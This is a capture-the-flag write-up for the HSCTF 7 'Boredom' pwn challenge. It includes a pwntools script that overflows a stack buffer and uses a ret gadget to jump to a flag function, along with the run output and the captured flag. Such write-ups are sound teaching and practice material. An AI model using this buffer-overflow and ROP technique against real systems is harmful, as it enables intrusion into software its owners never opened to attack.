# HSCTF 7

## Boredom

> 100
>
> Keith is bored and stuck at home. Give him some things to do.
>
> Connect at `nc pwn.hsctf.com 5002`.
>
> Note, if you're having trouble getting it to work remotely:
>
>    check your offset, the offset is slightly different on the remote server
>    the addresses are still the same
>
> Author: PMP
>
> [`boredom`](boredom) [`boredom.c`](boredom.c)

Tags: _pwn_ _bof_ _rop_ _x86-64_

## Summary

This is the most basic of buffer overflow pwns.  However it's not as simple as smashing the stack and calling `flag`.

I have already explained how to solve this here: [https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) (search for stack-alignment).


## Exploit

```
#!/usr/bin/python3

from pwn import *

#p = process('./boredom')
p = remote('pwn.hsctf.com', 5002)

binary = ELF('boredom')

context.update(arch='amd64')
rop = ROP('boredom')
try:
	ret = rop.find_gadget(['ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

p.recvuntil('Give me something to do:')

payload  = 0xd8 * b'A'
payload += p64(ret)
payload += p64(binary.symbols['flag'])

p.sendline(payload)
p.stream()
```

Output:

```
# ./exploit.py
[+] Opening connection to pwn.hsctf.com on port 5002: Done
[*] '/pwd/datajerk/hsctf7/boredom/boredom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for 'boredom'
 Ehhhhh, maybe later.
Hey, that's a neat idea. Here's a flag for your trouble: flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}

Now go away.
```

